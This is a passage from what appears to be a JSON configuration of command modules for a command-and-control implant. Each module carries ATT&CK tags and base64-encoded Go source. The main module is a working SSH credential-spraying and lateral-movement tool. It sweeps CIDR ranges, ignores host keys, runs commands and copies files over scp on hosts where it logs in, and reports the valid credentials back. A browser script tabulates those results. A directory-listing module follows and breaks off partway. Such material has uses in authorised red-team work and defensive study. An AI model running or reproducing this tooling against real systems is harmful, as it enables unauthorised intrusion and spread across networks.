              "sshauth.go": "cGFja2FnZSBzc2hhdXRoCgppbXBvcnQgKAoJImNvbnRleHQiCgkiZW5jb2RpbmcvanNvbiIKCSJmbXQiCgkiaW8vaW91dGlsIgoJInN5bmMiCgkidGltZSIKCSJwb3J0c2NhbiIKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJnb2xhbmcub3JnL3gvY3J5cHRvL3NzaCIKCSJnb2xhbmcub3JnL3gvc3luYy9zZW1hcGhvcmUiCgkiZ2l0aHViLmNvbS90bWMvc2NwIgoJInBrZy9wcm9maWxlcyIKKQoKdmFyICgKCXNzaFJlc3VsdENoYW4gPSBtYWtlKGNoYW4gU1NIUmVzdWx0KQoJbXUgc3luYy5NdXRleAopCgovLyBTU0hBdXRoZW50aWNhdG9yIEdvdmVybnMgdGhlIGxvY2sgb2Ygc3NoIGF1dGhlbnRpY2F0aW9uIGF0dGVtcHRzCnR5cGUgU1NIQXV0aGVudGljYXRvciBzdHJ1Y3QgewoJaG9zdCBzdHJpbmcKCWxvY2sgKnNlbWFwaG9yZS5XZWlnaHRlZAp9CgovLyBDcmVkZW50aWFsIE1hbmFnZXMgY3JlZGVudGlhbCBvYmplY3RzIGZvciBhdXRoZW50aWNhdGlvbgp0eXBlIENyZWRlbnRpYWwgc3RydWN0IHsKCVVzZXJuYW1lICAgc3RyaW5nCglQYXNzd29yZCAgIHN0cmluZwoJUHJpdmF0ZUtleSBzdHJpbmcKfQoKdHlwZSBTU0hUZXN0UGFyYW1zIHN0cnVjdCB7CglIb3N0cyAgICAgIFtdc3RyaW5nIGBqc29uOiJob3N0cyJgCglQb3J0ICAgICAgIGludCAgICAgIGBqc29uOiJwb3J0ImAKCVVzZXJuYW1lICAgc3RyaW5nICAgYGpzb246InVzZXJuYW1lImAKCVBhc3N3b3JkICAgc3RyaW5nICAgYGpzb246InBhc3N3b3JkImAKCVByaXZhdGVLZXkgc3RyaW5nICAgYGpzb246InByaXZhdGVfa2V5ImAKCUNvbW1hbmQgICAgc3RyaW5nICAgYGpzb246ImNvbW1hbmQiYAoJU291cmNlICAgICBzdHJpbmcgICBganNvbjoic291cmNlImAKCURlc3RpbmF0aW9uIHN0cmluZyAgYGpzb246ImRlc3RpbmF0aW9uImAKfQoKdHlwZSBTU0hSZXN1bHQgc3RydWN0IHsKCVN0YXR1cyAgIHN0cmluZyBganNvbjoic3RhdHVzImAKCVN1Y2Nlc3MgIGJvb2wgICBganNvbjoic3VjY2VzcyJgCglVc2VybmFtZSBzdHJpbmcgYGpzb246InVzZXJuYW1lImAKCVNlY3JldCAgIHN0cmluZyBganNvbjoic2VjcmV0ImAKCU91dHB1dCAgIHN0cmluZyBganNvbjoib3V0cHV0ImAKCUhvc3QgICAgIHN0cmluZyBganNvbjoiaG9zdCJgCglDb3B5U3RhdHVzIHN0cmluZyBganNvbjoiY29weV9zdGF0dXMiYAp9CgovLyBTU0ggRnVuY3Rpb25zCmZ1bmMgUHVibGljS2V5RmlsZShmaWxlIHN0cmluZykgc3NoLkF1dGhNZXRob2QgewoJYnVmZmVyLCBlcnIgOj0gaW91dGlsLlJlYWRGaWxlKGZpbGUpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gbmlsCgl9CgoJa2V5LCBlcnIgOj0gc3NoLlBhcnNlUHJpdmF0ZUtleShidWZmZXIpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gbmlsCgl9CglyZXR1cm4gc3NoLlB1YmxpY0tleXMoa2V5KQp9CgpmdW5jIFNTSExvZ2luKGhvc3Qgc3RyaW5nLCBwb3J0IGludCwgY3JlZCBDcmVkZW50aWFsLCBkZWJ1ZyBib29sLCBjb21tYW5kIHN0cmluZywgc291cmNlIHN0cmluZywgZGVzdGluYXRpb24gc3RyaW5nKSB7Cgl2YXIgc3NoQ29uZmlnICpzc2guQ2xpZW50Q29uZmlnCglpZiBjcmVkLlByaXZhdGVLZXkgPT0gIiIgewoJCXNzaENvbmZpZyA9ICZzc2guQ2xpZW50Q29uZmlnewoJCQlVc2VyOiAgICAgICAgICAgIGNyZWQuVXNlcm5hbWUsCgkJCUhvc3RLZXlDYWxsYmFjazogc3NoLkluc2VjdXJlSWdub3JlSG9zdEtleSgpLAoJCQlUaW1lb3V0OiAgICAgICAgIDUwMCAqIHRpbWUuTWlsbGlzZWNvbmQsCgkJCUF1dGg6ICAgICAgICAgICAgW11zc2guQXV0aE1ldGhvZHtzc2guUGFzc3dvcmQoY3JlZC5QYXNzd29yZCl9LAoJCX0KCX0gZWxzZSB7CgkJc3NoQ29uZmlnID0gJnNzaC5DbGllbnRDb25maWd7CgkJCVVzZXI6ICAgICAgICAgICAgY3JlZC5Vc2VybmFtZSwKCQkJVGltZW91dDogICAgICAgICA1MDAgKiB0aW1lLk1pbGxpc2Vjb25kLAoJCQlIb3N0S2V5Q2FsbGJhY2s6IHNzaC5JbnNlY3VyZUlnbm9yZUhvc3RLZXkoKSwKCQkJQXV0aDogICAgICAgICAgICBbXXNzaC5BdXRoTWV0aG9ke1B1YmxpY0tleUZpbGUoY3JlZC5Qcml2YXRlS2V5KX0sCgkJfQoJfQoJLy8gbG9nLlByaW50bG4oIkRpYWxpbmc6IiwgaG9zdCkKCXJlcyA6PSBTU0hSZXN1bHR7CgkJSG9zdDogICAgIGhvc3QsCgkJVXNlcm5hbWU6IGNyZWQuVXNlcm5hbWUsCgl9CglpZiBjcmVkLlByaXZhdGVLZXkgPT0gIiIgewoJCXJlcy5TZWNyZXQgPSBjcmVkLlBhc3N3b3JkCgkJLy8gc3VjY2Vzc1N0ciA9IGZtdC5TcHJpbnRmKCJbU1NIXSBIb3N0bmFtZTogJXNcdFVzZXJuYW1lOiAlc1x0UGFzc3dvcmQ6ICVzIiwgaG9zdCwgY3JlZC5Vc2VybmFtZSwgY3JlZC5QYXNzd29yZCkKCX0gZWxzZSB7CgkJcmVzLlNlY3JldCA9IGNyZWQuUHJpdmF0ZUtleQoJCS8vIHN1Y2Nlc3NTdHIgPSBmbXQuU3ByaW50ZigiW1NTSF0gSG9zdG5hbWU6ICVzXHRVc2VybmFtZTogJXNcdFBhc3N3b3JkOiAlcyIsIGhvc3QsIGNyZWQuVXNlcm5hbWUsIGNyZWQuUHJpdmF0ZUtleSkKCX0KCWNvbm5lY3Rpb25TdHIgOj0gZm10LlNwcmludGYoIiVzOiVkIiwgaG9zdCwgcG9ydCkKCWNvbm5lY3Rpb24sIGVyciA6PSBzc2guRGlhbCgidGNwIiwgY29ubmVjdGlvblN0ciwgc3NoQ29uZmlnKQoJaWYgZXJyICE9IG5pbCB7CgkJaWYgZGVidWcgewoJCQllcnJTdHIgOj0gZm10LlNwcmludGYoIltERUJVR10gRmFpbGVkIHRvIGRpYWw6ICVzIiwgZXJyKQoJCQlmbXQuUHJpbnRsbihlcnJTdHIpCgkJfQoJCXJlcy5TdWNjZXNzID0gZmFsc2UKCQlzc2hSZXN1bHRDaGFuIDwtIHJlcwoJCXJldHVybgoJfQoJc2Vzc2lvbiwgZXJyIDo9IGNvbm5lY3Rpb24uTmV3U2Vzc2lvbigpCglkZWZlciBzZXNzaW9uLkNsb3NlKCkKCWlmIGVyciAhPSBuaWwgewoJCXJlcy5TdWNjZXNzID0gZmFsc2UKCQlyZXMuU3RhdHVzID0gZXJyLkVycm9yKCkKCQlzc2hSZXN1bHRDaGFuIDwtIHJlcwoJCXJldHVybgoJfQoJaWYgc291cmNlICE9ICIiICYmIGRlc3RpbmF0aW9uICE9ICIiewogICAgICAgIGVyciA9IHNjcC5Db3B5UGF0aChzb3VyY2UsIGRlc3RpbmF0aW9uLCBzZXNzaW9uKQogICAgICAgIGlmIGVyciAhPSBuaWx7CiAgICAgICAgICAgIHJlcy5Db3B5U3RhdHVzID0gIkZhaWxlZCB0byBjb3B5OiAiICsgZXJyLkVycm9yKCkKICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgcmVzLkNvcHlTdGF0dXMgPSAiU3VjY2Vzc2Z1bGx5IGNvcGllZCIKICAgICAgICB9Cgl9CglpZiBjb21tYW5kICE9ICIiewogICAgICAgIG1vZGVzIDo9IHNzaC5UZXJtaW5hbE1vZGVzewogICAgICAgICAgICBzc2guRUNITzogICAwLCAvL2Rpc2FibGUgZWNob2luZwogICAgICAgICAgICBzc2guVFRZX09QX0lTUEVFRDogMTQ0MDAsCiAgICAgICAgICAgIHNzaC5UVFlfT1BfT1NQRUVEOiAxNDQwMCwKICAgICAgICB9CiAgICAgICAgZXJyID0gc2Vzc2lvbi5SZXF1ZXN0UHR5KCJ4dGVybSIsIDgwLCA0MCwgbW9kZXMpCiAgICAgICAgaWYgZXJyICE9IG5pbHsKICAgICAgICAgICAgcmVzLlN1Y2Nlc3MgPSBmYWxzZQogICAgICAgICAgICByZXMuU3RhdHVzID0gZXJyLkVycm9yKCkKICAgICAgICAgICAgcmVzLk91dHB1dCA9ICJGYWlsZWQgdG8gcmVxdWVzdCBQVFkiCiAgICAgICAgICAgIHNzaFJlc3VsdENoYW4gPC0gcmVzCiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KICAgICAgICBvdXRwdXQsIGVyciA6PSBzZXNzaW9uLk91dHB1dChjb21tYW5kKQogICAgICAgIGlmIGVyciAhPSBuaWx7CgogICAgICAgIH0KICAgICAgICByZXMuT3V0cHV0ID0gc3RyaW5nKG91dHB1dCkKCX1lbHNlewoJICAgIHJlcy5PdXRwdXQgPSAiIgoJfQoJLy9zZXNzaW9uLkNsb3NlKCkKCXJlcy5TdWNjZXNzID0gdHJ1ZQoJc3NoUmVzdWx0Q2hhbiA8LSByZXMKfQoKZnVuYyAoYXV0aCAqU1NIQXV0aGVudGljYXRvcikgQnJ1dGUocG9ydCBpbnQsIGNyZWRzIFtdQ3JlZGVudGlhbCwgZGVidWcgYm9vbCwgY29tbWFuZCBzdHJpbmcsIHNvdXJjZSBzdHJpbmcsIGRlc3RpbmF0aW9uIHN0cmluZykgewoJd2cgOj0gc3luYy5XYWl0R3JvdXB7fQoKCWZvciBpIDo9IDA7IGkgPCBsZW4oY3JlZHMpOyBpKysgewoJCWF1dGgubG9jay5BY3F1aXJlKGNvbnRleHQuVE9ETygpLCAxKQoJCXdnLkFkZCgxKQoJCWdvIGZ1bmMocG9ydCBpbnQsIGNyZWQgQ3JlZGVudGlhbCwgZGVidWcgYm9vbCwgY29tbWFuZCBzdHJpbmcsIHNvdXJjZSBzdHJpbmcsIGRlc3RpbmF0aW9uIHN0cmluZykgewoJCQlkZWZlciBhdXRoLmxvY2suUmVsZWFzZSgxKQoJCQlkZWZlciB3Zy5Eb25lKCkKCQkJU1NITG9naW4oYXV0aC5ob3N0LCBwb3J0LCBjcmVkLCBkZWJ1ZywgY29tbWFuZCwgc291cmNlLCBkZXN0aW5hdGlvbikKCQl9KHBvcnQsIGNyZWRzW2ldLCBkZWJ1ZywgY29tbWFuZCwgc291cmNlLCBkZXN0aW5hdGlvbikKCX0KCXdnLldhaXQoKQp9CgpmdW5jIFNTSEJydXRlSG9zdChob3N0IHN0cmluZywgcG9ydCBpbnQsIGNyZWRzIFtdQ3JlZGVudGlhbCwgZGVidWcgYm9vbCwgY29tbWFuZCBzdHJpbmcsIHNvdXJjZSBzdHJpbmcsIGRlc3RpbmF0aW9uIHN0cmluZykgewoJdmFyIGxpbSBpbnQ2NCA9IDEwMAoJYXV0aCA6PSAmU1NIQXV0aGVudGljYXRvcnsKCQlob3N0OiBob3N0LAoJCWxvY2s6IHNlbWFwaG9yZS5OZXdXZWlnaHRlZChsaW0pLAoJfQoJYXV0aC5CcnV0ZShwb3J0LCBjcmVkcywgZGVidWcsIGNvbW1hbmQsIHNvdXJjZSwgZGVzdGluYXRpb24pCn0KCmZ1bmMgU1NIQnJ1dGVGb3JjZShob3N0cyBbXXN0cmluZywgcG9ydCBpbnQsIGNyZWRzIFtdQ3JlZGVudGlhbCwgZGVidWcgYm9vbCwgY29tbWFuZCBzdHJpbmcsIHNvdXJjZSBzdHJpbmcsIGRlc3RpbmF0aW9uIHN0cmluZykgW11TU0hSZXN1bHQgewoJZm9yIGkgOj0gMDsgaSA8IGxlbihob3N0cyk7IGkrKyB7CgkJZ28gZnVuYyhob3N0IHN0cmluZywgcG9ydCBpbnQsIGNyZWRzIFtdQ3JlZGVudGlhbCwgZGVidWcgYm9vbCwgY29tbWFuZCBzdHJpbmcsIHNvdXJjZSBzdHJpbmcsIGRlc3RpbmF0aW9uIHN0cmluZykgewoJCQlTU0hCcnV0ZUhvc3QoaG9zdCwgcG9ydCwgY3JlZHMsIGRlYnVnLCBjb21tYW5kLCBzb3VyY2UsIGRlc3RpbmF0aW9uKQoJCX0oaG9zdHNbaV0sIHBvcnQsIGNyZWRzLCBkZWJ1ZywgY29tbWFuZCwgc291cmNlLCBkZXN0aW5hdGlvbikKCX0KCXZhciBzdWNjZXNzZnVsSG9zdHMgW11TU0hSZXN1bHQKCWZvciBpIDo9IDA7IGkgPCBsZW4oaG9zdHMpOyBpKysgewoJCXJlcyA6PSA8LXNzaFJlc3VsdENoYW4KCQlpZiByZXMuU3VjY2VzcyB7CgkJCXN1Y2Nlc3NmdWxIb3N0cyA9IGFwcGVuZChzdWNjZXNzZnVsSG9zdHMsIHJlcykKCQl9Cgl9CglyZXR1cm4gc3VjY2Vzc2Z1bEhvc3RzCn0KCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7CgkKCXBhcmFtcyA6PSBTU0hUZXN0UGFyYW1ze30KCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCgkvLyBsb2cuUHJpbnRsbigiVGFzayBwYXJhbXM6Iiwgc3RyaW5nKHRhc2suUGFyYW1zKSkKCWVyciA6PSBqc29uLlVubWFyc2hhbChbXWJ5dGUodGFzay5QYXJhbXMpLCAmcGFyYW1zKQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoJLy8gbG9nLlByaW50bG4oIlBhcnNlZCB0YXNrIHBhcmFtcyEiKQoJaWYgbGVuKHBhcmFtcy5Ib3N0cykgPT0gMCB7CgkJbXNnLlVzZXJPdXRwdXQgPSAiTWlzc2luZyBob3N0KHMpIHBhcmFtZXRlci4iCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJaWYgcGFyYW1zLlBhc3N3b3JkID09ICIiICYmIHBhcmFtcy5Qcml2YXRlS2V5ID09ICIiIHsKCQltc2cuVXNlck91dHB1dCA9ICJNaXNzaW5nIHBhc3N3b3JkIHBhcmFtZXRlciIKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglpZiBwYXJhbXMuVXNlcm5hbWUgPT0gIiIgewoJCW1zZy5Vc2VyT3V0cHV0ID0gIk1pc3NpbmcgdXNlcm5hbWUgcGFyYW1ldGVyLiIKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCgl2YXIgdG90YWxIb3N0cyBbXXN0cmluZwoJZm9yIGkgOj0gMDsgaSA8IGxlbihwYXJhbXMuSG9zdHMpOyBpKysgewoJCW5ld0NpZHIsIGVyciA6PSBwb3J0c2Nhbi5OZXdDSURSKHBhcmFtcy5Ib3N0c1tpXSkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJY29udGludWUKCQl9IGVsc2UgewoJCQkvLyBJdGVyYXRlIHRocm91Z2ggZXZlcnkgaG9zdCBpbiBob3N0Q2lkcgoJCQlmb3IgaiA6PSAwOyBqIDwgbGVuKG5ld0NpZHIuSG9zdHMpOyBqKysgewoJCQkJdG90YWxIb3N0cyA9IGFwcGVuZCh0b3RhbEhvc3RzLCBuZXdDaWRyLkhvc3RzW2pdLlByZXR0eU5hbWUpCgkJCX0KCQkJLy8gY2lkcnMgPSBhcHBlbmQoY2lkcnMsIG5ld0NpZHIpCgkJfQoJfQoKCWlmIHBhcmFtcy5Qb3J0ID09IDAgewoJCXBhcmFtcy5Qb3J0ID0gMjIKCX0KCgljcmVkIDo9IENyZWRlbnRpYWx7CgkJVXNlcm5hbWU6ICAgcGFyYW1zLlVzZXJuYW1lLAoJCVBhc3N3b3JkOiAgIHBhcmFtcy5QYXNzd29yZCwKCQlQcml2YXRlS2V5OiBwYXJhbXMuUHJpdmF0ZUtleSwKCX0KCS8vIGxvZy5QcmludGxuKCJCZWdpbm5pbmcgYnJ1dGUgZm9yY2UuLi4iKQoJcmVzdWx0cyA6PSBTU0hCcnV0ZUZvcmNlKHRvdGFsSG9zdHMsIHBhcmFtcy5Qb3J0LCBbXUNyZWRlbnRpYWx7Y3JlZH0sIGZhbHNlLCBwYXJhbXMuQ29tbWFuZCwgcGFyYW1zLlNvdXJjZSwgcGFyYW1zLkRlc3RpbmF0aW9uKQoJLy8gbG9nLlByaW50bG4oIkZpbmlzaGVkISIpCglpZiBsZW4ocmVzdWx0cykgPiAwIHsKCQlkYXRhLCBlcnIgOj0ganNvbi5NYXJzaGFsSW5kZW50KHJlc3VsdHMsICIiLCAiICAgICIpCgkJLy8gLy8gZm10LlByaW50bG4oIkRhdGE6Iiwgc3RyaW5nKGRhdGEpKQoJCWlmIGVyciAhPSBuaWwgewoJCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJCW11LkxvY2soKQoJCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJCW11LlVubG9jaygpCgkJCXJldHVybgoJCX0gZWxzZSB7CgkJCS8vIGZtdC5QcmludGxuKCJTZW5kaW5nIG9uIHVwIHRoZSBkYXRhOlxuIiwgc3RyaW5nKGRhdGEpKQoJCQltc2cuVXNlck91dHB1dCA9IHN0cmluZyhkYXRhKQoJCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoKCQkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCQltdS5Mb2NrKCkKCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCQltdS5VbmxvY2soKQoJCQlyZXR1cm4KCQl9Cgl9IGVsc2UgewoJCS8vIGxvZy5QcmludGxuKCJObyBzdWNjZXNzZnVsIGF1dGhzLiIpCgkJbXNnLlVzZXJPdXRwdXQgPSAiTm8gc3VjY2Vzc2Z1bCBhdXRoZW5pY2F0aW9uIGF0dGVtcHRzIgoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCQp9Cg=="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpIHsNCiAgICBjb25zdCBjYXBpdGFsaXplID0gKHMpID0+IHsNCiAgICAgICAgaWYgKHR5cGVvZiBzICE9PSAnc3RyaW5nJykgcmV0dXJuICcnDQogICAgICAgIHJldHVybiBzLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsgcy5zbGljZSgxKQ0KICAgIH07DQogICAgdmFyIHRvdGFsX291dHB1dCA9ICIiOw0KICAgIHZhciB0b3RhbF9yZXN1bHRzID0gIiI7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCByZXNwb25zZS5sZW5ndGg7IGkrKykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgdG90YWxfcmVzdWx0cyArPSByZXNwb25zZVtpXVsicmVzcG9uc2UiXTsNCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIHJldHVybiByZXNwb25zZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UodG90YWxfcmVzdWx0cyk7DQoJCXZhciBvdXRwdXQgPSAiIjsNCgkJdmFyIHJvd3MgPSBbXTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKykgew0KICAgIAl2YXIgcm93X3N0eWxlID0gIiI7DQogICAgCXZhciBjZWxsX3N0eWxlID0gew0KICAgICAgICAgICAgImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsDQogICAgICAgICAgICAidHlwZSI6ICJ0ZXh0LWFsaWduOmNlbnRlciINCiAgICAgICAgfTsNCiAgICAgICAgaWYgKGRhdGFbaV1bInN1Y2Nlc3MiXSkgew0KICAgICAgICAgICAgcm93X3N0eWxlID0gImJhY2tncm91bmQtY29sb3I6ICMwMDgwMDA7Ig0KICAgICAgICB9DQogICAgICAgIHJvd3MucHVzaCh7DQogICAgICAgICAgICAiSG9zdCI6IGRhdGFbaV1bImhvc3QiXSwNCiAgICAgICAgICAgICJVc2VybmFtZSI6IGRhdGFbaV1bInVzZXJuYW1lIl0sDQogICAgICAgICAgICAiU2VjcmV0IjogZGF0YVtpXVsic2VjcmV0Il0sDQogICAgICAgICAgICAiU3VjY2VzcyI6IGRhdGFbaV1bInN1Y2Nlc3MiXSwNCiAgICAgICAgICAgICJPdXRwdXQiOiAiPHByZT4iICsgZGF0YVtpXVsib3V0cHV0Il0gKyAiPC9wcmU+IiwNCiAgICAgICAgICAgICJDb3B5X1N0YXR1cyI6IGRhdGFbaV1bJ2NvcHlfc3RhdHVzJ10sDQogICAgICAgICAgICAicm93LXN0eWxlIjogcm93X3N0eWxlLA0KICAgICAgICAgICAgImNlbGwtc3R5bGUiOiB7DQogICAgICAgICAgICAgICAgImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsDQogICAgICAgICAgICAgICAgInR5cGUiOiAidGV4dC1hbGlnbjpjZW50ZXIiDQogICAgICAgICAgICB9DQogICAgICAgIH0pOw0KICAgIH0NCiAgICBvdXRwdXQgKz0gc3VwcG9ydF9zY3JpcHRzWydjcmVhdGVfdGFibGUnXShbew0KICAgICAgICAgICAgIm5hbWUiOiAiSG9zdCIsDQogICAgICAgICAgICAic2l6ZSI6ICI0ZW0iDQogICAgICAgIH0sIHsNCiAgICAgICAgICAgICJuYW1lIjogIlVzZXJuYW1lIiwNCiAgICAgICAgICAgICJzaXplIjogIjRlbSINCiAgICAgICAgfSwgew0KICAgICAgICAgICAgIm5hbWUiOiAiU2VjcmV0IiwNCiAgICAgICAgICAgICJzaXplIjogIjRlbSINCiAgICAgICAgfSwgew0KICAgICAgICAgICAgIm5hbWUiOiAiU3VjY2VzcyIsDQogICAgICAgICAgICAic2l6ZSI6ICIxZW0iDQogICAgICAgIH0sIHsNCiAgICAgICAgCSJuYW1lIjogIk91dHB1dCIsDQogICAgICAgIAkic2l6ZSI6ICIxMGVtIg0KICAgICAgICB9LCB7DQogICAgICAgIAkibmFtZSI6ICJDb3B5X1N0YXR1cyIsDQogICAgICAgIAkic2l6ZSI6ICIyZW0iDQogICAgICAgIH1dLCByb3dzKTsNCiAgICAgICAgDQogICAgICAgIHRvdGFsX291dHB1dCArPSBvdXRwdXQ7DQogICAgcmV0dXJuIHRvdGFsX291dHB1dDsNCn0="
        },
        {
          "needs_admin": false,
          "help_cmd": "ls [directory]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "List directory",
          "cmd": "ls",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1083",
              "attack_name": "File and Directory Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "ls.go": "cGFja2FnZSBscwoKaW1wb3J0ICgKCSJlbmNvZGluZy9qc29uIgoJImlvL2lvdXRpbCIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKCSJwa2cvcHJvZmlsZXMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp0eXBlIERpcmVjdG9yeUVudHJpZXMgc3RydWN0IHsKCUVudHJpZXMgW11GaWxlRGF0YSBganNvbjoiZW50cmllcyJgCn0KCnR5cGUgRmlsZURhdGEgc3RydWN0IHsKCUZpbGVuYW1lICAgICBzdHJpbmcgYGpzb246IkZpbGVuYW1lImAKCUZpbGVTaXplICAgICBpbnQ2NCAgYGpzb246IlNpemUiYAoJTGFzdE1vZGlmaWVkIHN0cmluZyBganNvbjoiTGFzdG1vZGlmaWVkImAKCURpcmVjdG9yeSAgICBib29sICAgYGpzb246IklzRGlyImAKCVBlcm1pc3Npb25zICBzdHJpbmcgYGpzb246IlBlcm1pc3Npb25zImAKfQoKZnVuYyBSdW4odGFzayBzdHJ1Y3RzLlRhc2spIHsKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJaWYgbGVuKHRhc2suUGFyYW1zKSA9PSAwIHsKCQl0YXNrLlBhcmFtcyA9ICIuIgoJfQoJZmlsZXMsIGVyciA6PSBpb3V0aWwuUmVhZERpcih0YXNrLlBhcmFtcykKCgkKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglmaWxlRW50cmllcyA6PSBtYWtlKFtdRmlsZURhdGEsIGxlbihmaWxlcykpCgoJZm9yIGkgOj0gMDsgaSA8IGxlbihmaWxlcyk7IGkrKyB7CgkJZmlsZUVudHJpZXNbaV0uRmlsZW5hbWUgPSBmaWxlc1tpXS5OYW1lKCkKCQlmaWxlRW50cmllc1tpXS5EaXJlY3RvcnkgPSBmaWxlc1tpXS5Jc0RpcigpCgkJZmlsZUVudHJpZXNbaV0uRmlsZVNpemUgPSBmaWxlc1tpXS5TaXplKCkKCQlmaWxlRW50cmllc1tpXS5MYXN0TW9kaWZpZWQgPSBmaWxlc1tpXS5Nb2RUaW1lKCkuU3RyaW5nKCkKCQlmaWxlRW50cmllc1tpXS5QZXJtaXNzaW9ucyA9IGZpbGVzW2ldLk1vZGUoKS5QZXJtKCkuU3RyaW5nKCkKCX0KCgl2YXIgZSBEaXJlY3RvcnlFbnRyaWVzCgllLkVudHJpZXMgPSBmaWxlRW50cmllcwoKCWRhdGEsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQoZSwgIiIsICIJIikKCglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CiAgICBtc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBzdHJpbmcoZGF0YSkKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmls